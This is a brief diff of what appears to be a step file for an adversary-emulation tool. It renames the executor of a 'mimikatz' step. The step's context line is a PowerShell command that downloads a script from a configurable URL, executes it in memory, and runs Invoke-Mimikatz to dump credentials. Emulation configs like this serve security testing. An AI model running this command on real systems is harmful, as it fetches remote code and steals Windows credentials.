@@ -22,4 +22,4 @@ steps:
     - name: mimikatz
       inline: |
         powershell.exe "IEX (New-Object Net.WebClient).DownloadString('{{.Args.mimurl}}'); Invoke-Mimikatz -DumpCreds"
-      executor: command_prompt
+      executor: cmd
